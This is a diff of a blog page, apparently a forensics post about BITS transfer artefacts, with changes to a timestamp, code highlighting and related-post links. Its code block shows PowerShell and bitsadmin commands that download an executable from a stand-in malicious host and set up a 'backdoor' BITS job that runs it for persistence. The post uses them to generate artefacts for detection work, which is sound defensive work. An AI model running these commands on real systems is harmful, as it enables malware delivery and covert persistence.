@@ -29,7 +29,7 @@
     
 
     
-      <meta content="2018-02-18T00:00:00+11:00" property="article:published_time">
+      <meta content="2018-02-18T00:00:00+00:00" property="article:published_time">
       <meta content="http://localhost:4000/about/" property="article:author">
     
 
@@ -162,14 +162,14 @@
 <h3 id="artefact-creation">Artefact creation</h3>
 <p>Most of my testing has been working with BITS 5.5 in Windows 8.1, however the content below was tested on Windows 7 through 10.</p>
 
-<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="c1"># Bits download initiated via Powershell</span>
-<span class="nb">PS</span><span class="o">&gt;</span> <span class="nb">Start-BitsTransfer</span> -Source <span class="s2">"http://www.totallylegitinappnews.com/mimi.jpg"</span> -Destination <span class="s2">"c:\Windows\vss\mimi.exe"</span>
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="c"># Bits download initiated via Powershell</span><span class="w">
+</span><span class="nf">PS</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Start-BitsTransfer</span><span class="w"> </span><span class="nt">-Source</span><span class="w"> </span><span class="s2">"http://www.totallylegitinappnews.com/mimi.jpg"</span><span class="w"> </span><span class="nt">-Destination</span><span class="w"> </span><span class="s2">"c:\Windows\vss\mimi.exe"</span><span class="w">
 
-<span class="c1"># Peristence via bitsadmin.exe</span>
-CMD&gt; bitsadmin /create backdoor
-CMD&gt; bitsadmin /addfile backdoor <span class="s2">"http://www.totallylegitinappnews.com/evil.exe"</span>  <span class="s2">"c:\windows\VSS\evil.exe"</span>
-CMD&gt; bitsadmin /SetNotifyCmdLine backdoor c:\Windows\VSS\evil.exe NULL
-CMD&gt; bitsadmin /resume backdoor</code></pre></figure>
+</span><span class="c"># Peristence via bitsadmin.exe</span><span class="w">
+</span><span class="nf">CMD</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">bitsadmin</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">backdoor</span><span class="w">
+</span><span class="nf">CMD</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">bitsadmin</span><span class="w"> </span><span class="nx">/addfile</span><span class="w"> </span><span class="nx">backdoor</span><span class="w"> </span><span class="s2">"http://www.totallylegitinappnews.com/evil.exe"</span><span class="w">  </span><span class="s2">"c:\windows\VSS\evil.exe"</span><span class="w">
+</span><span class="nf">CMD</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">bitsadmin</span><span class="w"> </span><span class="nx">/SetNotifyCmdLine</span><span class="w"> </span><span class="nx">backdoor</span><span class="w"> </span><span class="nx">c:\Windows\VSS\evil.exe</span><span class="w"> </span><span class="nx">NULL</span><span class="w">
+</span><span class="nf">CMD</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">bitsadmin</span><span class="w"> </span><span class="nx">/resume</span><span class="w"> </span><span class="nx">backdoor</span></code></pre></figure>
 
 <p>I have shown some really simple examples above to generate artefacts, however in the wild there are also several attack tools that make building stealthy download cradles trivial. Please see references for more information.</p>
 
@@ -307,6 +307,23 @@ Process command line visibility on the endpoints to spot evil process chains and
               <ul>
             
                 <li class="relatedPost">
+                  <a href="https://mgreen27.github.io/posts/2019/11/10/LRwithVRaptor.html">Live response automation with Velociraptor</a>
+                  
+                    (Categories: <a href="/category/posts">posts</a>)
+                  
+                </li>
+          
+          
+        
+      
+    
+  
+    
+      
+        
+          
+            
+                <li class="relatedPost">
                   <a href="https://mgreen27.github.io/posts/2019/06/09/O365HiddenRules.html">O365: Hidden InboxRules</a>
                   
                     (Categories: <a href="/category/posts">posts</a>)
@@ -397,16 +414,6 @@ Process command line visibility on the endpoints to spot evil process chains and
       
         
           
-            
-                <li class="relatedPost">
-                  <a href="https://mgreen27.github.io/posts/2018/01/14/Invoke-LiveResponse.html">Invoke-LiveResponse</a>
-                  
-                    (Categories: <a href="/category/posts">posts</a>)
-                  
-                </li>
-          
-          
-        
       
     
   
